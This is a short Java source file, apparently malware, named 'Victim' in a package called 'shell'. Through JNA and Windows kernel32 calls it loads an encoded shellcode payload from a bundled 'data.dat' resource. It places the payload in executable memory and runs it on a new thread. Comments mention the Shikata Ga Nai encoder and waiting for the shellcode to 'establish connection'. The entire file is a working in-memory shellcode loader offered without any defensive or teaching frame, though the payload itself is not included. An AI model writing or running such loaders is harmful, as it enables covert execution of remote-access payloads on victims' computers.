package shell;

import com.sun.jna.Native;
import com.sun.jna.win32.StdCallLibrary;
import java.io.InputStream;

public class Victim {

    public interface Kernel32 extends StdCallLibrary {
        long VirtualAlloc(long lpAddress, long dwSize, int flAllocationType, int flProtect);
        long CreateThread(long lpThreadAttributes, long dwStackSize, long lpStartAddress, long lpParameter, int dwCreationFlags, long lpThreadId);
        int WaitForSingleObject(long hHandle, int dwMilliseconds);
    }

    public static void main(String[] args) {
        try {
            Kernel32 k32 = Native.load("kernel32", Kernel32.class);

            System.out.println("[*] Loading encrypted shellcode...");
            InputStream is = Victim.class.getResourceAsStream("/data.dat");
            if (is == null) {
                System.out.println("[!] data.dat not found!");
                return;
            }
            byte[] shellcode = is.readAllBytes();

            System.out.println("[*] Allocating RWX memory for self-decrypting payload...");
            // 0x3000 = MEM_COMMIT | MEM_RESERVE
            // 0x40 = PAGE_EXECUTE_READWRITE (REQUIRED for Shikata Ga Nai)
            long address = k32.VirtualAlloc(0, shellcode.length, 0x3000, 0x40);

            com.sun.jna.Pointer pointer = new com.sun.jna.Pointer(address);
            pointer.write(0, shellcode, 0, shellcode.length);

            System.out.println("[*] Executing stealth thread at: " + Long.toHexString(address));
            long threadHandle = k32.CreateThread(0, 0, address, 0, 0, 0);

            // Wait for shellcode to establish connection
            k32.WaitForSingleObject(threadHandle, 10000);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
